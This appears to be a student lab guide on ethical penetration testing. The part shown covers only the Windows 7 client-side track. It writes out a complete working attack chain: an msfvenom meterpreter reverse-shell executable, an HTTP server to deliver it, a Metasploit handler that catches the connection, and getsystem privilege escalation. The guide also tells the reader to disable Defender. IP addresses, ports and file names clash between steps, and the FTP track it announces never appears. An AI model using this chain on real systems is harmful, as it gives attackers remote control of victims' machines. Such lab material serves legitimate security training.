## lab work revolves around ethical penetration testing using the Cyber Kill Chain model, with two main practical tracks
```
    1. Windows-based client-side attack (via payload delivery and privilege escalation)
    2. Server-side FTP vulnerability exploitation (on Metasploitable Linux)
```
## 🔧 Prerequisites
```
Make sure you have:

    VirtualBox (or VMware)
    Kali Linux (attacker machine)
    Windows 7 VM (victim client) — for Track 1
    Metasploitable Linux 2 (vulnerable server) — for Track 2
    All VMs on the same network mode (Host-only or Bridged as needed)
```

## 🛠️ TRACK 1: Windows-based client-side attack (via payload delivery)
### Step 1: Set Up Vulnerable Windows 7 VM
```
Create a new VM in VirtualBox
Install Windows 7 using an ISO.
Disable Windows Defender:
```

### Step 2: Generate Malicious Payload

Get your Kali IP atfirst:

**Command** - 
```
ip a
```

**Command**: 
```
sudo msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<**kali_ip**> lport=4554 -f exe -o any_name.exe
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.102 LPORT=4554 -f exe -o hackme.exe


Here the payload generation is successful and saved as our given name myexploit.exe 

### Step 3: Host Payload for Delivery
### **Command**(N.B (Use port 8000 (or any port except 4554)): 
```
python3 -m http.server -b <your_machine_ip> <port_number>
```

**Example**- After that open browser from the victim machine and use the url you just started as server  http://192.168.0.7:8999 
### example - python3 -m http.server -b 192.168.56.102 4444 
### Now download the payload you have just created. 


## **System Exploitation & Gaining Access**

### Step 1: 
Go to new terminal and use the below command to start metasploit console 
**Command**:
```
msfconsole  
```
### Step 2: 
Use the Multi Handler mood in metasploit. 
**Command**: 
```
use exploit/multi/handler 
```
### Step 3: 
Set listening payload which is same as our msfvenom payload 
**Command**: 
```
set payload payload/windows/x64/meterpreter/reverse_tcp 
```
### Step 4: Now check the available options 
**Command**: 
```
show options
```
### Step 5: Local Host Setup 
Now set the LHOST (attacker machine IP or interface) where the victim 
machine will connect. 

**Command**:
```
set lhost 192.168.0.7 
```
### Step 6: now set the LHOST port (reverse connection port)  
**Command**: 
```
set lport 4444 
```
Then use,  
**Command**: 
```
exploit
```
### Step 7: now download the file and run it .(dont do it earlier)

### Step 8: Now we will check the system info and the privileges we have gained. 
**Command**: 
```
sysinfo 
```
**Command**: 
```
getsystem 
```
